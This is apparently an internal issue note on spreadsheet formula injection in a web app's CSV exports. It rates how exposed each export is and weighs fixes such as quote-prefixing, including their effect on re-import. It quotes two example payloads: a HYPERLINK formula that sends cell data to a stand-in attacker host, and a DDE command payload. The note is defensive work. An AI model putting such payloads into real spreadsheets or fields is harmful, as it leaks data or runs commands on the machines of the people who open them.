# CSV exports do not guard against spreadsheet formula injection

## Background

`CsvExportTarget` in `adapters/tabular_export.py` writes every cell as it is,
with `csv.writer`. Four exports use it:

- respondents (`entrypoints/blueprints/respondents.py`)
- the dashboard report (`entrypoints/blueprints/backoffice.py`)
- targets (`entrypoints/blueprints/targets.py`)
- users with their signup survey answers (`entrypoints/blueprints/admin.py`)

Found in review of the targets export, which added free-text columns - a
target's comment, its category's comment and its source - to what a CSV
download can carry.

## The problem

Excel, LibreOffice and Numbers treat a cell starting with `=`, `+`, `-` or `@`
(and, in some versions, a tab or carriage return) as a formula when the CSV is
opened. A value such as `=HYPERLINK("https://evil.example/?d="&A2,"Click")`
in a respondent's answer or a target comment runs when an organiser opens the
download. Older Excel also honoured DDE payloads (`=cmd|' /C calc'!A0`), though
it now warns before running them.

How exposed each export is:

| Export | Who writes the text | Exposure |
| --- | --- | --- |
| Respondents | Members of the public, via registration or an uploaded file | The real one |
| Targets | Organisers of the same project | Low - an organiser attacking another |
| Users | Invited users, in the signup survey's free-text answers | Moderate - opened by an admin |
| Dashboard | Computed figures and target names | Low |

The Google Sheets exports are not affected: gspread 6's `Worksheet.update()`
defaults to `raw=True`, so cells are written with `valueInputOption=RAW` and a
leading `=` stays text. Keep it that way - switching to `USER_ENTERED` would
open the same hole there.

## Options

1. **Prefix a quote.** OWASP's recommendation: a cell starting with one of the
   trigger characters gets a leading `'`, and any embedded quote is doubled.
   Simple, done once in `CsvExportTarget.write_sheet`. The cost is that the
   `'` is part of the data: a negative number written as text (`-3`) would
   come out as `'-3`, so numeric columns need to be left alone, which means
   the target has to know which columns are numeric or only escape strings
   that do not parse as numbers.
2. **Escape only free-text columns.** Let `TabularData` mark which columns
   hold user text and escape only those. More precise, more plumbing.
3. **Do nothing and document it.** Defensible for targets alone; harder to
   defend for respondents.

## Round-tripping

The targets export is designed to be uploaded again through the targets CSV
import. If option 1 or 2 is taken, the import (`service_layer/target_csv_import.py`)
must strip the added `'` from the text columns, or every export-and-upload
cycle adds another one to a comment that starts with `-` or `=`. The same
goes for any other export people may upload again, such as a respondents
export fed back in as a respondents CSV.
